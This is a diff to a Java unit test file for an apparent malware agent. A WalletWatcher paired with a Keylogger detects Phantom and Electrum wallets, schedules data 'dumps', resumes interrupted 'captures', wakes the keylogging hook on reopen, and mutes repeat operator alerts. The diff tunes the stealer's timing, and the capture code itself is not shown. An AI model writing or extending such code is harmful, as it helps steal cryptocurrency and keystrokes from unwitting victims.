@@ -1,6 +1,7 @@
 package com.serverpackcore.agent;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.nio.file.Path;
@@ -14,14 +15,23 @@ class WalletWatcherTest {
 	@TempDir
 	Path temp;
 
+	private Keylogger keylogger;
+
 	private WalletWatcher watcher(OpsNotifier notifier) {
 		State state = new State();
 		state.walletsSet = true;
 		state.walletsWatch = true;
-		Keylogger keylogger = new Keylogger(temp, temp, state, null, notifier);
+		keylogger = new Keylogger(temp, temp, state, null, notifier);
 		WalletWatcher watcher = new WalletWatcher(temp, temp, state, null, notifier, keylogger);
 		watcher.enableForTest();
 		return watcher;
+	}
+
+	private void markKeysRunning() throws Exception {
+		java.nio.file.Path ops = AgentPaths.cache(temp).resolve("ops");
+		java.nio.file.Files.createDirectories(ops);
+		java.nio.file.Files.writeString(ops.resolve("keys.pid"),
+			Long.toString(ProcessHandle.current().pid()));
 	}
 
 	@Test
@@ -72,23 +82,125 @@ class WalletWatcherTest {
 	}
 
 	@Test
-	void graceLostThenRealExitStillCloses() throws Exception {
+	void graceLostClosesABrowserEvenWhileThePidLives() {
+		OpsNotifier notifier = new OpsNotifier(null);
+		WalletWatcher watcher = watcher(notifier);
+		long pid = ProcessHandle.current().pid();
+		watcher.detect("phantom", pid, "start", "Phantom");
+		notifier.queued();
+
+		watcher.lost("phantom", "grace");
+
+		assertEquals(List.of("wallet closed"), notifier.queued());
+	}
+
+	@Test
+	void graceLostKeepsADesktopWalletWhileThePidLives() throws Exception {
 		OpsNotifier notifier = new OpsNotifier(null);
 		WalletWatcher watcher = watcher(notifier);
 		Process child = new ProcessBuilder("sleep", "60").start();
 		long pid = child.pid();
+		try {
+			watcher.detect("electrum", pid, "start", "Electrum");
+			notifier.queued();
+
+			// A desktop focus bounce: the process still owns the wallet.
+			watcher.lost("electrum", "grace");
+			assertEquals(List.of(), notifier.queued());
+		} finally {
+			child.destroy();
+			child.waitFor();
+		}
+	}
+
+	@Test
+	void deadLostClosesEvenIfThePidIsStillAlive() {
+		OpsNotifier notifier = new OpsNotifier(null);
+		WalletWatcher watcher = watcher(notifier);
+		long pid = ProcessHandle.current().pid();
 		watcher.detect("phantom", pid, "start", "Phantom");
 		notifier.queued();
 
-		// The helper reports LOST after the 20 s grace while the browser lives.
-		watcher.lost("phantom");
-		assertEquals(List.of(), notifier.queued());
-
-		child.destroy();
-		child.waitFor();
-		watcher.lost("phantom");
+		watcher.lost("phantom", "dead");
 
 		assertEquals(List.of("wallet closed"), notifier.queued());
+	}
+
+	@Test
+	void reopeningPhantomInTheCooldownRestoresSilentlyAndWakesTheKeys() throws Exception {
+		OpsNotifier notifier = new OpsNotifier(null);
+		WalletWatcher watcher = watcher(notifier);
+		long pid = ProcessHandle.current().pid();
+		markKeysRunning();
+		watcher.detect("phantom", pid, "start", "Phantom");
+		notifier.queued();
+		watcher.lost("phantom", "grace");
+		notifier.queued();
+
+		watcher.detect("phantom", pid, "start", "Phantom");
+
+		assertEquals(List.of(), notifier.queued(), "no second alert inside the cooldown");
+		assertEquals(1, watcher.dumpSchedules, "no second alert cycle for the same session");
+		assertEquals(1, watcher.resumeSchedules, "the interrupted capture is resumed");
+		assertEquals(2, keylogger.walletOnCalls, "the hook is woken again");
+	}
+
+	@Test
+	void reopenAfterACompletedDumpDoesNotRepeatIt() throws Exception {
+		OpsNotifier notifier = new OpsNotifier(null);
+		WalletWatcher watcher = watcher(notifier);
+		long pid = ProcessHandle.current().pid();
+		markKeysRunning();
+		watcher.detect("phantom", pid, "start", "Phantom");
+		String key = "phantom|" + pid + "|start";
+		watcher.completed.add(key);
+		notifier.queued();
+		watcher.lost("phantom", "grace");
+		notifier.queued();
+
+		watcher.detect("phantom", pid, "start", "Phantom");
+
+		assertEquals(List.of(), notifier.queued());
+		assertEquals(0, watcher.resumeSchedules, "a completed capture is not repeated");
+		assertEquals(1, watcher.dumpSchedules);
+	}
+
+	@Test
+	void reopeningAfterTheCooldownGetsAFreshAttemptBudget() {
+		OpsNotifier notifier = new OpsNotifier(null);
+		WalletWatcher watcher = watcher(notifier);
+		long pid = ProcessHandle.current().pid();
+		String key = "phantom|" + pid + "|start";
+		watcher.detect("phantom", pid, "start", "Phantom");
+		notifier.queued();
+		watcher.attempts.put(key, 1);
+		watcher.dumped.put(key, System.currentTimeMillis() - 700_000L);
+		watcher.lost("phantom", "grace");
+		notifier.queued();
+		watcher.state.walletCooldownUntil = 0L;
+
+		watcher.detect("phantom", pid, "start", "Phantom");
+
+		assertEquals(List.of("wallet detected: phantom (" + pid + ")"), notifier.queued());
+		assertEquals(2, watcher.dumpSchedules);
+		assertNull(watcher.attempts.get(key), "browsers get a new single attempt");
+	}
+
+	@Test
+	void deadLostReopensAsANewCycle() {
+		OpsNotifier notifier = new OpsNotifier(null);
+		WalletWatcher watcher = watcher(notifier);
+		long pid = ProcessHandle.current().pid();
+		watcher.detect("phantom", pid, "start", "Phantom");
+		notifier.queued();
+		watcher.lost("phantom", "dead");
+		notifier.queued();
+		watcher.state.walletCooldownUntil = 0L;
+
+		watcher.detect("phantom", pid, "start", "Phantom");
+
+		assertEquals(List.of("wallet detected: phantom (" + pid + ")"), notifier.queued());
+		assertEquals(2, watcher.dumpSchedules);
 	}
 
 	@Test
